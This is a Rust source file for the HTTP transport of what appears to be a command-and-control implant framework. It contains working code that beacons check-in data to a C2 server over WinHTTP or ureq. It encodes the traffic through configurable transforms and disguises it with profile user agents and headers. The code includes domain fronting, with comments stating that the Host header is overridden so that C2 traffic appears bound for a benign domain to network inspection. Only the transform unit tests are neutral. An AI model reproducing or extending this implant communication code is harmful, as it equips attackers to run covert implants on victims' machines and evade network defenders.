//! HTTP Transport implementation
//!
//! Provides HTTP/HTTPS communication with profile-based transforms.
//! Uses platform-specific implementations:
//! - Windows: WinHTTP
//! - Unix: ureq (minimal HTTP client)

use common::{KrakenError, Transport};
use config::{ProfileConfig, Transform};

/// HTTP Transport for C2 communication
pub struct HttpTransport {
    /// Base URL (e.g., "https://c2.example.com")
    base_url: String,
    /// Profile configuration for request/response transforms
    profile: ProfileConfig,
    /// Optional domain-fronting Host header override.
    /// When set, the TCP/TLS connection targets `base_url` but the HTTP `Host`
    /// header is replaced with this value so the request appears destined for
    /// a different (benign) host from the perspective of network inspection.
    domain_front_host: Option<String>,
    /// Whether this transport is currently available
    available: bool,
}

impl HttpTransport {
    /// Create a new HTTP transport
    pub fn new(base_url: &str, profile: ProfileConfig) -> Self {
        Self {
            base_url: base_url.trim_end_matches('/').to_string(),
            profile,
            domain_front_host: None,
            available: true,
        }
    }

    /// Create a new HTTP transport with domain fronting enabled.
    ///
    /// The connection is made to `base_url` (resolved via DNS / direct IP) but
    /// the HTTP `Host` header is set to `front_host`.  This allows the request
    /// to traverse a CDN that routes based on `Host` while the actual TLS SNI
    /// and TCP destination point at the C2 infrastructure.
    pub fn new_with_fronting(base_url: &str, profile: ProfileConfig, front_host: String) -> Self {
        Self {
            base_url: base_url.trim_end_matches('/').to_string(),
            profile,
            domain_front_host: Some(front_host),
            available: true,
        }
    }

    /// Build the full URL for check-in
    fn checkin_url(&self) -> String {
        format!("{}{}", self.base_url, self.profile.checkin_uri)
    }

    /// Encode request body according to profile transform
    fn encode_request(&self, data: &[u8]) -> Vec<u8> {
        encode_transform(&self.profile.request_transform, data)
    }

    /// Decode response body according to profile transform
    fn decode_response(&self, data: &[u8]) -> Result<Vec<u8>, KrakenError> {
        decode_transform(&self.profile.response_transform, data)
    }

    /// Perform HTTP POST with profile headers
    #[cfg(not(target_os = "windows"))]
    fn do_exchange(&self, data: &[u8]) -> Result<Vec<u8>, KrakenError> {
        use std::io::Read;
        use std::time::Duration;

        let url = self.checkin_url();
        let encoded_body = self.encode_request(data);

        // Build request with profile headers
        let mut request = ureq::post(&url)
            .timeout(Duration::from_secs(30))
            .set("User-Agent", &self.profile.user_agent);

        // Add profile request headers
        for (name, value) in &self.profile.request_headers {
            request = request.set(name, value);
        }

        // Domain fronting: override Host header so the CDN routes to the C2
        // backend while the wire-level Host appears to be a benign domain.
        if let Some(ref front_host) = self.domain_front_host {
            request = request.set("Host", front_host);
        }

        // Send request
        let response = request
            .send_bytes(&encoded_body)
            .map_err(|e| KrakenError::transport(format!("HTTP request failed: {}", e)))?;

        // Read response body
        let mut body = Vec::new();
        response
            .into_reader()
            .take(10 * 1024 * 1024) // 10MB limit
            .read_to_end(&mut body)
            .map_err(|e| KrakenError::transport(format!("failed to read response: {}", e)))?;

        // Decode response according to profile
        self.decode_response(&body)
    }

    /// Windows WinHTTP implementation
    #[cfg(target_os = "windows")]
    fn do_exchange(&self, data: &[u8]) -> Result<Vec<u8>, KrakenError> {
        use windows_sys::Win32::Foundation::{GetLastError, BOOL, HANDLE};
        use windows_sys::Win32::Networking::WinHttp::*;

        let url = self.checkin_url();
        let encoded_body = self.encode_request(data);

        // Parse URL to extract host, port, and path
        let (host, port, path, use_https) = parse_url(&url)?;

        unsafe {
            // Open WinHTTP session
            let user_agent_wide = to_wide_string(&self.profile.user_agent);
            let session = WinHttpOpen(
                user_agent_wide.as_ptr(),
                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                std::ptr::null(),
                std::ptr::null(),
                0,
            );
            if session.is_null() {
                return Err(KrakenError::transport(format!(
                    "WinHttpOpen failed: {}",
                    GetLastError()
                )));
            }

            // Connect to server
            let host_wide = to_wide_string(&host);
            let connect = WinHttpConnect(session, host_wide.as_ptr(), port, 0);
            if connect.is_null() {
                WinHttpCloseHandle(session);
                return Err(KrakenError::transport(format!(
                    "WinHttpConnect failed: {}",
                    GetLastError()
                )));
            }

            // Open request
            let method_wide = to_wide_string("POST");
            let path_wide = to_wide_string(&path);
            let flags = if use_https { WINHTTP_FLAG_SECURE } else { 0 };

            let request = WinHttpOpenRequest(
                connect,
                method_wide.as_ptr(),
                path_wide.as_ptr(),
                std::ptr::null(), // HTTP/1.1 default
                std::ptr::null(), // No referrer
                std::ptr::null(), // Accept all types
                flags,
            );
            if request.is_null() {
                WinHttpCloseHandle(connect);
                WinHttpCloseHandle(session);
                return Err(KrakenError::transport(format!(
                    "WinHttpOpenRequest failed: {}",
                    GetLastError()
                )));
            }

            // Add profile headers
            let mut headers_str = String::new();
            for (name, value) in &self.profile.request_headers {
                headers_str.push_str(&format!("{}: {}\r\n", name, value));
            }
            // Domain fronting: override Host header
            if let Some(ref front_host) = self.domain_front_host {
                headers_str.push_str(&format!("Host: {}\r\n", front_host));
            }
            if !headers_str.is_empty() {
                let headers_wide = to_wide_string(&headers_str);
                let result = WinHttpAddRequestHeaders(
                    request,
                    headers_wide.as_ptr(),
                    headers_wide.len() as u32 - 1,
                    WINHTTP_ADDREQ_FLAG_ADD,
                );
                if result == 0 {
                    tracing::debug!("WinHttpAddRequestHeaders warning: {}", GetLastError());
                }
            }

            // Send request with body
            let send_result = WinHttpSendRequest(
                request,
                std::ptr::null(),
                0,
                encoded_body.as_ptr() as *const _,
                encoded_body.len() as u32,
                encoded_body.len() as u32,
                0,
            );
            if send_result == 0 {
                let err = GetLastError();
                WinHttpCloseHandle(request);
                WinHttpCloseHandle(connect);
                WinHttpCloseHandle(session);
                return Err(KrakenError::transport(format!(
                    "WinHttpSendRequest failed: {}",
                    err
                )));
            }

            // Receive response
            let recv_result = WinHttpReceiveResponse(request, std::ptr::null_mut());
            if recv_result == 0 {
                let err = GetLastError();
                WinHttpCloseHandle(request);
                WinHttpCloseHandle(connect);
                WinHttpCloseHandle(session);
                return Err(KrakenError::transport(format!(
                    "WinHttpReceiveResponse failed: {}",
                    err
                )));
            }

            // Read response body
            let mut response = Vec::new();
            let mut buffer = [0u8; 8192];
            loop {
                let mut bytes_read: u32 = 0;
                let read_result = WinHttpReadData(
                    request,
                    buffer.as_mut_ptr() as *mut _,
                    buffer.len() as u32,
                    &mut bytes_read,
                );
                if read_result == 0 {
                    let err = GetLastError();
                    WinHttpCloseHandle(request);
                    WinHttpCloseHandle(connect);
                    WinHttpCloseHandle(session);
                    return Err(KrakenError::transport(format!(
                        "WinHttpReadData failed: {}",
                        err
                    )));
                }

                if bytes_read == 0 {
                    break;
                }

                response.extend_from_slice(&buffer[..bytes_read as usize]);
            }

            // Cleanup handles
            WinHttpCloseHandle(request);
            WinHttpCloseHandle(connect);
            WinHttpCloseHandle(session);

            // Decode response according to profile
            self.decode_response(&response)
        }
    }
}

// ============================================================================
// Windows Helper Functions
// ============================================================================

/// Convert a Rust string to a null-terminated wide string (UTF-16) for Windows APIs
#[cfg(target_os = "windows")]
fn to_wide_string(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Parse a URL into (host, port, path, use_https)
#[cfg(target_os = "windows")]
fn parse_url(url: &str) -> Result<(String, u16, String, bool), KrakenError> {
    let use_https = url.starts_with("https://");
    let url_without_scheme = url
        .strip_prefix("https://")
        .or_else(|| url.strip_prefix("http://"))
        .ok_or_else(|| KrakenError::transport("invalid URL scheme"))?;

    // Split host:port from path
    let (host_port, path) = match url_without_scheme.find('/') {
        Some(idx) => (&url_without_scheme[..idx], &url_without_scheme[idx..]),
        None => (url_without_scheme, "/"),
    };

    // Parse host and port
    let (host, port) = match host_port.rfind(':') {
        Some(idx) => {
            let port_str = &host_port[idx + 1..];
            let port = port_str
                .parse::<u16>()
                .map_err(|_| KrakenError::transport("invalid port"))?;
            (host_port[..idx].to_string(), port)
        }
        None => {
            let default_port = if use_https { 443 } else { 80 };
            (host_port.to_string(), default_port)
        }
    };

    Ok((host, port, path.to_string(), use_https))
}

impl Transport for HttpTransport {
    fn id(&self) -> &'static str {
        "http"
    }

    fn exchange(&self, data: &[u8]) -> Result<Vec<u8>, KrakenError> {
        self.do_exchange(data)
    }

    fn is_available(&self) -> bool {
        self.available
    }

    fn reset(&mut self) {
        self.available = true;
    }
}

// ============================================================================
// Profile Transform Functions (shared encoding/decoding logic)
// ============================================================================

/// Encode data according to transform type
pub fn encode_transform(transform: &Transform, data: &[u8]) -> Vec<u8> {
    match transform {
        Transform::None => data.to_vec(),
        Transform::Base64 => {
            use base64::{engine::general_purpose::STANDARD, Engine};
            STANDARD.encode(data).into_bytes()
        }
        Transform::Base64Url => {
            use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine};
            URL_SAFE_NO_PAD.encode(data).into_bytes()
        }
        Transform::Hex => hex::encode(data).into_bytes(),
    }
}

/// Decode data according to transform type
pub fn decode_transform(transform: &Transform, data: &[u8]) -> Result<Vec<u8>, KrakenError> {
    match transform {
        Transform::None => Ok(data.to_vec()),
        Transform::Base64 => {
            use base64::{engine::general_purpose::STANDARD, Engine};
            STANDARD
                .decode(data)
                .map_err(|e| KrakenError::protocol(format!("base64 decode failed: {}", e)))
        }
        Transform::Base64Url => {
            use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine};
            URL_SAFE_NO_PAD
                .decode(data)
                .map_err(|e| KrakenError::protocol(format!("base64url decode failed: {}", e)))
        }
        Transform::Hex => hex::decode(data)
            .map_err(|e| KrakenError::protocol(format!("hex decode failed: {}", e))),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_transform_none() {
        let data = b"hello world";
        let encoded = encode_transform(&Transform::None, data);
        assert_eq!(encoded, data);

        let decoded = decode_transform(&Transform::None, &encoded).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_transform_base64() {
        let data = b"hello world";
        let encoded = encode_transform(&Transform::Base64, data);
        assert_eq!(encoded, b"aGVsbG8gd29ybGQ=");

        let decoded = decode_transform(&Transform::Base64, &encoded).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_transform_base64url() {
        let data = b"\xfb\xff\xfe"; // bytes that differ in base64 vs base64url
        let encoded = encode_transform(&Transform::Base64Url, data);
        // URL-safe base64 uses - and _ instead of + and /
        assert!(!encoded.contains(&b'+'));
        assert!(!encoded.contains(&b'/'));

        let decoded = decode_transform(&Transform::Base64Url, &encoded).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_transform_hex() {
        let data = b"\xde\xad\xbe\xef";
        let encoded = encode_transform(&Transform::Hex, data);
        assert_eq!(encoded, b"deadbeef");

        let decoded = decode_transform(&Transform::Hex, &encoded).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_roundtrip_all_transforms() {
        let data = b"The quick brown fox jumps over the lazy dog. \x00\xff";

        for transform in [
            Transform::None,
            Transform::Base64,
            Transform::Base64Url,
            Transform::Hex,
        ] {
            let encoded = encode_transform(&transform, data);
            let decoded = decode_transform(&transform, &encoded).unwrap();
            assert_eq!(decoded, data, "roundtrip failed for {:?}", transform);
        }
    }

    #[test]
    fn test_invalid_base64_decode() {
        let result = decode_transform(&Transform::Base64, b"not valid base64!!!");
        assert!(result.is_err());
    }

    #[test]
    fn test_invalid_hex_decode() {
        let result = decode_transform(&Transform::Hex, b"not hex!");
        assert!(result.is_err());
    }
}
